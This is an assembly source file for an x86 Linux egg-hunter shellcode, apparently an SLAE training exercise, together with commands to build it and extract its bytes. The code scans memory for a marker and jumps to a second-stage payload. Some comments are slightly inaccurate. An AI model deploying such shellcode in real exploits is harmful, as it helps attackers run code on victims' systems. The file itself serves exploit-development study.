; Filename:      egghunter-v3.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  05.12.2018
; Note:          x86 code but assembled and linked on x64
; Assembler:     nasm -f elf32 egghunter-v3.nasm -o egghunter-v3.o
; Linker:        ld -m elf_i386 egghunter-v3.o -o egghunter-v3
; Assembly dump: objdump -d ./egghunter-v3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	; Egg hunter v3

next_page:

	or cx,0xfff         ; Set 0x?????000 Memory alignment, next inc instruction +0x1000

next_address:

	inc ecx             ; edx + 1
	xor eax, eax        ; Clear eax register
	mov al, 0x43        ; eax = 0x00000043 = 67
	int 0x80            ; sys_sigaction

	cmp al,0xf2         ; Compare return in al of sys_access with 0xf2 (EFAULT) and set ZF flag
	jz next_page        ; if EFAULT jump to nextpage

	mov eax,0x50905090  ; Set egg: X,NOP,X,NOP
	mov edi,ecx         ; Move ecx pointer in edi for comparison
	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
	jnz next_address    ; If not second egg jump to next address
	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
	jnz next_address    ; If not second egg jump to next address
	jmp edi             ; Start second stage shellcode
